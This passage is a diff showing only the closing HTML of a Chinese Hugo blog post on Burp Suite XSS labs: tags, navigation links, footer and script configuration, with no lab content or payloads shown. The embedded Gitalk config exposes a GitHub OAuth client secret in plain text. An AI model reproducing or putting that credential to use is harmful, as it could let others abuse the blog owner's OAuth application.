+      <div class="post-info-md"><span><a href="/burp%E5%AE%98%E6%96%B9xss%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/xss/' class="post-tag">XSS</a><a href='/tags/%E9%9D%B6%E5%9C%BA/' class="post-tag">靶场</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/js%E9%80%86%E5%90%91%E5%88%9D%E5%AD%A6%E7%AC%94%E8%AE%B0/" class="post-nav-item" rel="prev" title="JS逆向初学笔记"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>JS逆向初学笔记</a>
+      <a href="/burp%E5%AE%98%E6%96%B9ssrf%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/" class="post-nav-item" rel="next" title="Burp官方ssrf靶场记录">Burp官方ssrf靶场记录<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+        Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk" rel="external nofollow noopener noreferrer">Gitalk</a>.
+      </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.115.4">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://shuai06.github.io"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/gitalk/gitalk.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/gitalk/gitalk.min.js"></script><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/lunr/lunr.stemmer.support.min.js" defer></script><script src="/lib/lunr/lunr.zh.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"gitalk":{"admin":["shuai06"],"clientID":"d75ec1a5864747376f6f","clientSecret":"1b354dc131534bb3b7511213c74d3f9116a03a79","id":"2025-03-04T11:11:30+08:00","owner":"shuai06","repo":"hexo-gitalk","title":"Burp官方xss靶场记录"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"pangu":{"enable":true,"selector":"article"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"watermark":{"appendto":".wrapper\u003emain","colspacing":30,"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"fontfamily":"inherit","fontsize":0.85,"height":21,"opacity":0.0125,"rotate":15,"rowspacing":60,"width":150}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
